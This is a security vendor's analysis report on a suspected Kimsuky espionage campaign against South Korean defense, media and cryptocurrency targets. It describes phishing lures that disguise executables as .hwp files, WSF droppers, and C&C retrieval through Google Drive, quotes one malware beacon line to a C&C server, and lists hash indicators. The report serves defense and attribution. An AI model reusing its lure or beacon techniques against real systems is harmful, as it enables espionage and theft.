The perpetrators behind the mail and malware are assumed to be the so-called\nKimsuky threat group or Kimsuky group.\n\nKimsuky group was first identified in 2013, when the Russian security company Kaspersky Lab released a\nreport analyzing a cyber-espionage campaign by the group. The name derives from the email account,\n“Kimsukyang,” which was used as drop-point for stolen data at the time.\n\nSince 2013, Kimsuky group has continued a cyber- attack campaign against government organizations and\ndefense-related agencies in South Korea as well as institutions and corporations related to South Korea’s\nengagement with North Korea. After the January 2019 spear-phishing attack, more activity by the Kimsuky\ngroup was detected in February 2019 during the period ahead of the second U.S.-North Korea summit in Hanoi.\n\nIn the meantime, notable signs point to an expanded target list that includes financial firms and cryptocurrency\norganizations along with the political sector. As North Korea’s economic situation continues to deteriorate due\nto ongoing sanctions, the attackers appear to be aiming for financial gains in addition to its political agenda.\n\nThis report presents a detailed analysis on the series of recent attacks, of which the Kimsuky group has been\nsuspected, and the reasons for concluding that the group is the perpetrator.\n\n## Introduction: Operation Kabar Cobra\n\nWith the Kimsuky group mounting a sustained campaign of attacks against South Korea’s defense-related\norganizations and media companies, the attackers were recently found targeting a number of enterprises\nincluding those dealing in cryptocurrencies for financial gain. A spate of malware was distributed with the file\nname “Cobra” and a mutex called “KABAR” were identified in several of the attacks.\n\nFigure 1. Mutex string included in the malicious code\n\nBased on these findings, the security researchers at AhnLab Security Emergency Response Center (ASEC)\nsuspect that the recent wave of attacks originated from the Kimsuky group and have named it “Operation\nKabar Cobra.”\n\n\n-----\n\nAnalysis Report_Operation Kabar Cobra\n\n## Analysis of the Malware\n\n#### 1. Malware Functions and Operations\n\nTable 1 provides a summary of verified malware attacks (droppers) and their targets by Kimsuky from\nDecember 2018 to January 2019. In order to deceive its victims, the attacker used a Hancom Office file (.hwp),\nwhich is a widely used word processing program in South Korea. Note that the date of discovery of the files in\nTable 1 and the actual date of their drop may be different.\n\n**Date** **Decoy file** **File name** **Target**\n\nHancom 2019 사업계획서.hwp{blank}.exe\n\nDefense-related organization\n\nOffice file\n\n2018-12-26\n\n(The file name can be translated to “2019\n\n(ROTC)\n\n(.hwp)\n\nBusiness plan”)\n\n미디어 권력이동⑥-넷플렉스, 유튜\n\nHancom 브.hwp{blank}.exe Media\nOffice file\n\n2019-01-07\n\n(Ministry of Unification press\n\n(The file name can be translated to\n\n(.hwp) corps)\n\n“Shifting the power of media ⑥-Netflix,\n\nYouTube”)\n\n중국-연구자료.hwp{blank}.scr\n\nHancom\nOffice file\n\n2019-01-20 (The file name can be translated to Unknown\n\n“Research of China- Reference\n\n(.hwp)\n\nmaterials”)\n\nTable 1. Dropper file name and type for each target\n\nThe attacker disguised the dropper with a Hancom Office file icon and used a double extension including .hwp\nfor the file name. As shown in Table 1, a blank was inserted between the two extensions to make it difficult to\nrecognize the files as an executable (.exe) or screen saver (.scr). Clicking on the files displays content that\nappears to be a regular .hwp document file being opened. To add a further layer of deception, the file’s content\nis disguised so as to appear to reflect a topic that could reasonably appear in the target’s regular line of work.\n\nAn in-depth analysis of the malware that was sent out in the early morning hours of January 7 to the Ministry\nof Unification (MoU) press corps is shown in Table 1; it explains features and functions of the Operation Kabar\nCobra malware and how they operate.\n\nThe email sent to members of the MoU press corps bears the subject “TF reference materials” with a zipped\n\nfile attachment titled “TF 참고.zip” (The file name can be translated to “TF reference.zip”). As noted in Figure\n\n|Date|Decoy file|File name|Target|\n|---|---|---|---|\n|2018-12-26|Hancom Office file (.hwp)|2019 사업계획서.hwp{blank}.exe (The file name can be translated to “2019 Business plan”)|Defense-related organization (ROTC)|\n|2019-01-07|Hancom Office file (.hwp)|미디어 권력이동⑥-넷플렉스, 유튜 브.hwp{blank}.exe (The file name can be translated to “Shifting the power of media ⑥-Netflix, YouTube”)|Media (Ministry of Unification press corps)|\n|2019-01-20|Hancom Office file (.hwp)|중국-연구자료.hwp{blank}.scr (The file name can be translated to “Research of China- Reference materials”)|Unknown|\n\n\n-----\n\nAnalysis Report_Operation Kabar Cobra\n\n2, the attachment contains a seemingly ordinary PDF file and a malicious file with a double extension\n(*.hwp[blank].exe)\n\nFigure 2. Malware distributed to press corps members\n\nThis malware is identical in form to the attack against defense institutions in Table 1, with both cases involving\nmalware disguised as a Hancom Office file (.hwp) and compressed with self-extraction (WinRAR SFX).\nRunning the zipped file will extract the file and run the malware, which then proceeds to initiate the actual\nmalicious activity. In addition, C&C information is acquired from the attacker’s Google Drive. The functions of\nthe malware shown in Figure 2 are as follows:\n\n##### (1) 2.wsf \n\n2.wsf downloads and runs additional malware. The necessary C&C information is downloaded from the\nattacker’s Google Drive storage.\n\nFigure 3. Downloading C&C information from the attacker’s Google Drive address\n\nThe file stored in the attacker’s Google Drive is shown in Figure 4, and includes the C&C information for\ndownloading the malware. The file could be altered at any time by the attacker. Malware that acts as a dropper\nusually contain hardcoded C&C information. If the C&C server is shut down, the attacker then has to go through\nthe hassle of rewriting and distributing new malware. In this instance, however, even if the C&C server is\nblocked, the attacker merely needs to change the file in the Google Drive, from which the malware can receive\ninstructions on connecting to a new C&C server and continue its nefarious actions.\n\n\n-----\n\nAnalysis Report_Operation Kabar Cobra\n\nFigure 4. File stored in the attacker’s Google Drive\n\nNote that the email address (countine.protector.mail@gmail.com) shown in the lower part of Figure 4 had been\npreviously used to send phishing email. An advisory notice related to this was sent out in 2018 by the Education\nCyber Security Center (ECSC) in South Korea.\n\nThe malware (brave.ct) downloaded by 2.wsf is decrypted in the process shown in Figure 5, and the file\nFreedom.dll created in the process is executed via PowerShell. If the infected PC is running in a 64-bit\nWindows environment, another file named AhnLabMon.dll is created.\n\nFigure 5. Executing the additionally-downloaded malware\n\n##### (2) 3.wsf\n\nLike 2.wsf, 3.wsf downloads C&C information from the file stored in the attacker’s Google Drive. However,\nwhile 2.wsf serves as a dropper that downloads and runs additional malware, 3.wsf carries out a variety of\nfunctions including deleting, downloading, and uploading files; running commands, transmitting logs, and\nupdating 3.wsf itself; and BASE64 encrypting and decrypting the files being sent to and from the C&C server.\n\n\n-----\n\nAnalysis Report_Operation Kabar Cobra\n\nConnecting to the C&C server was still available when AhnLab’s researchers began their investigation, which\nhelped them understand how 3.wsf communicates with the C&C server and what commands are sent. Before\ncarrying out its malicious activities, 3.wsf first receives its version information from the C&C server and\ncompares it to its own version number being executed on the infected PC. If the version on the C&C server is\nhigher, the latest version of 3.wsf is downloaded and executed, as shown in Figure 6.\n\nFigure 6. Comparing and updating the 3.wsf file’s version\n\nIn the particular case that AhnLab investigated, 3.wsf downloaded its 1.2 version from the C&C server as\nshown in Figure 7.\n\nFigure 7. The version information of 3.wsf downloaded from the C&C server\n\nAfter checking the version information, 3.wsf receives commands from the C&C server and writes the following\nparameters to carry out its functions. It sends a GET request to the C&C server, then receives and executes\nthe command encrypted in BASE64.\n\n\n\n- Parameters when connecting to the C&C server for commands:\nxhr.open(GET,serverurl+/board.php?m=+MAC_ADDR+&v=+VERSION+|+TIMEOUT,false);\nxhr.send();\n\n\nAs shown above, the attacker includes the version of 3.wsf in the parameters sent to the C&C server in order\nto check the current version of 3.wsf running on the infected PC so that the attacker can identify how many\nsystems are infected by each version.\n\nFigure 8 shows part of the communication taking place between 3.wsf and its C&C server; it reveals how 3.wsf\nreceives and execute the commands to download the list.dll file from the C&C server. However, 3.wsf does not\n\n\n-----\n\nAnalysis Report_Operation Kabar Cobra\n\ncontain the codes for executing the downloaded list.dll (or Cobra.dll). Instead, Freedom.dll (or AhnLabMon.dll),\nwhich is downloaded by 2.wsf, is confirmed to download and execute the same list.dll (Cobra.dll). Freedom.dll\n(AhnLabMon.dll) downloaded by 2.wsf calls DeleteUrlCacheEntryA() function to eliminate any trace that it\ndownloaded the list.dll file in order to prevent being tracked.\n\nFigure 8. Downloading the malware via C&C server communication\n\nThe list.dll (or Cobra.dll) file downloaded via communication with C&C server as shown in Figure 8 collects the\nsystem information and a list of folders and files, and copies compressed files in the infected system. With the\ncollected information, the attacker is able to determine whether the infected PC is a system that analyzes\nmalware. If the infected PC is confirmed to be a system that analyzes malware, then the malware shuts down\nthe analysis program and plants false flags in order to elude tracking\n\n#### 2. Malware Profiling\n\nThere were attacks targeting an apparel company and cryptocurrencies in South Korea while the attack against\nmilitary-related organizations and the media industry listed in Table 1 were taking place. These attacks may\nseem unrelated; however, similarities in malware were identified including the fact that the malware were\ndistributed from the same C&C server. The analysis of the timestamps in the related files also revealed that\nthe attackers have been periodically creating variant strains since at least two years ago.\n\nThrough malware profiling, AhnLab’s security researchers revealed that the attacks against the apparel\ncompany and cryptocurrencies were indeed related to Operation Kabar Cobra, and that Kimsuky was behind\nthese attacks. A considerable body of evidence was accumulated, of which only the key summary is provided\nbelow.\n\n##### (1) Malware distribution method\n\nThe malware are distributed in similar ways. A disguised document to lure the victim is accompanied by\nmalicious scripts in the form of a WinRAR SFX (self-extracting archive). In the attacks targeting\ncryptocurrencies, for example, a file disguised as an Excel file containing Ethereum transactions was used; in\nthe attacks against the apparel company, an Excel file masquerading as a quote and written in simplified\n\n\n-----\n\nAnalysis Report_Operation Kabar Cobra\n\nChinese was employed, as shown in Figure 9.\n\nFigure 9. Excel file disguised as a quote\n\nHowever, differences were spotted in how the C&C information was downloaded. In the attacks against military\nagencies and the media industry, C&C information was downloaded from the attacker’s Google Drive; in the\nattack against cryptos, downloading C&C information with the malicious script (2.wsf, 3.wsf) was skipped and\nthe C&C server was listed in a variable named server url.\n\n##### (2) Malware source and C&C server\n\nThe source of the malware and the C&C server, which have been identified by AhnLab’s security researchers,\npoint to a single IP that is connected to a number of URLs. These URLs hijack the well-known names of Google,\nMicrosoft, and representative portals and key cyber security companies in South Korea, including AhnLab. The\nattacker used these URLs to distribute malware or as phishing sites and C&C servers.\n\n##### (3) Shellcodes\n\nA comparison of the disguised malicious Hancom Office files used by Kimsuky in the 2014 and in 2018 attacks\nrevealed the fact that the same shellcodes exist in both files as shown in Figure 10. The upper part of Figure\n10 is the HWP file distributed in 2014, which has a file name that translates to “2014_ Design changes of Hanul\nnuclear reactor No. 1 and 2” in Korean; the bottom part of the Figure 10 is the HWP file distributed in 2018,\nwhich has the file name that translates to “2018_Declaration of the end of Korean war.”\n\nThe left section in Figure 10 compares the two shellcodes; the grey area indicates the overlapping codes of\nboth files, indicating these two malware have the same shellcodes.\n\n\n-----\n\nAnalysis Report_Operation Kabar Cobra\n\nFigure 10. Shellcodes of the malicious files from 2014 (top) and 2018 (bottom)\n\n##### (4) Operational process of offspring malware\n\nThe disguised malicious Hancom Office files created in 2017 and 2018 both created a malicious file named\ncore.dll. Both core.dll files used different files to run themselves, rundll32.exe and regsvr32.exe respectively,\nbut the codes are identical. In addition, both core.dll’s shut down the process if the program used to run\nthemselves was determined to be notepad.exe.\n\nThe decryption key pattern that the both core.dll’s used to decrypt the encrypted string shows they are identical:\n32-byte patterns in 4-byte components. Also, the codes show that both core.dll’s used to decrypt the encrypted\nstring are very similar though they are not completely identical. Moreover, both core.dll’s have malicious scripts\nthat make the codes and the way they execute are identical to those attacks examined above.\n\n\n-----\n\nAnalysis Report_Operation Kabar Cobra\n\n## Conclusion\n\nThere following is clear evidence that Kimsuky is responsible for a series of recent attacks targeting South\nKorean companies and institutions: the identical shellcodes; malware that share the same codes and operating\nprocesses; and the generation of identical additional malware and identical IP for connecting to the same C&C\nserver. In addition to evading detection by security solutions with encrypted files, Kimsuky uses various\ntechniques such as self-deletion and variable file names to elude security researchers.\n\nYet, there is a noticeable factor to which we should pay attention. Kimsuky, having showed such deviousness,\nused the same Hancom Office vulnerabilities and shellcodes used in the earlier 2014 attacks. It reveals that\nKimsuky is well aware of the fact that targets continue to use outdated versions of Hancom Office without\napplying basic security updates.\n\nIn this regard, it is highly recommended that organizations and companies be vigilant in keeping their assets\nupdated. In addition, organizations and companies should obtain full visibility into their internal systems to\ndetect and track security breaches.\n\n## AhnLab’s Response\n\nThe Operation Karbar Cobra relevant aliases identified by V3, AhnLab’s anti-virus program, are as below:\n\n|MD5|V3 alias|V3 engine version|\n|---|---|---|\n|20301fdd013c836039b8cfe0d100a1d7|Trojan/Win32.Agent|2019.01.21.02|\n|b02f3881321f0912b2ae3f27498c448f|Trojan/Win32.XwDoor|2014.01.28.03|\n|cd705902ea42d0de2a8456b055c3bb87|Malware/Win32.Possible_scrdl|2019.02.02.01|\n|54783422cfd7029a26a3f3f5e9087d8a|HWP/Exploit|2014.12.10.06|\n|b7359ae1a83323d3671e7c3a63ce7bf1|OLE/Cve-2017-11882.Gen|2018.04.05.03|\n|b994bd755e034d2218f8a3f70e91a165|Backdoor/Win32.Agent|2019.01.07.09|\n|ba89337af43f0b07a35cc892ac95112a|Backdoor/Win32.Akdoor|2017.07.13.00|\n|874c0ec36be15fe3403f3abad6ecea75|Downloader/Win32.Agent|2017.06.20.00|\n|ab73b1395938c48d62b7eeb5c9f3409d|Win-Trojan/Agent.5248512|2013.09.12.00|\n|f22db1e3ea74af791e34ad5aa0297664|JS/Agent|2018.05.31.03|\n|11fc4829c2fff9fb240acbd71c60fc67|Dropper/Win32.TeamRat|2014.04.10.01|\n|6106449779d453be4ae28d89f207e921|Trojan/Win32.Agent|2019.01.07.07|\n\n\n-----\n\nAnalysis Report_Operation Kabar Cobra\n\n95410a32a76aecb099af53255bb90737 Backdoor/Win32.Akdoor 2017.05.26.03\n\ndc1196876d9a59ab477ebc62d07a255e Malware/Win32.Possible_scrdl 2019.02.02.01\n\n0eb739c8faf77dae0546ff447ad06038 Dropper/Win32.Agent 2019.01.07.07\n\n242c31d0ce2109fdface788663e90f49 Trojan/Win32.Agent 2019.01.07.07\n\n66b73fba4e47b3184edd75b0ce9cf928 Trojan/Win32.Agent 2019.01.21.02\n\n71ec829db01818d305552ec4ebb1c258 Backdoor/Win32.Agent 2019.01.08.00\n\n9c3396aa94083916227201bf1396a2ca Dropper/Win32.Agent 2019.01.07.07\n\n1dfe826f71c20ff04987a9160c177e46 Backdoor/Win32.Agent 2019.01.07.09\n\n48d9e625ea3efbcbef3963c8714544a7 HWP/Exploit 2019.02.07.09\n\n4de21c3af64b3b605446278de92dfff4 Trojan/Win32.Akdoor 2018.05.30.00\n\nb49bbc11ed000211a5af7eb35f596886 VBS/Exploit 2019.02.12.00\n\n8332be776617364c16868c1ad6b4efe7 HWP/Exploit 2018.05.23.04\n\n9d685308d3125e14287ecb7fbe5fcd37 Backdoor/Win32.Agent 2019.01.07.09\n\nbb42e6649d927899c816cc04c2bffc06 Trojan/Win32.Agent 2017.06.12.00\n\n2fdf23367c604511d019a6914c50bc0b Trojan/Win32.Agent 2017.06.12.00\n\nAEA8D3002132094A58D5189A8E886CF8 HWP/Exploit 2017.05.31.03\n\n08523230E221246BB59CDE7C3E8363C7 Trojan/Win32.Akdoor 2016.09.28.01\n\n2f26f3a883aeca9a11769664fc7d4750 Backdoor/Win32.Akdoor 2017.05.26.03\n\n566cc6129dc887629a7131821c7547e5 Trojan/Win32.Agent 2017.06.12.00\n\na45ba001c3abee03bda49c6816d9a17c Backdoor/Win32.Agent 2019.01.08.00\n\n## IoC (Indicators of Compromise)\n\n1.
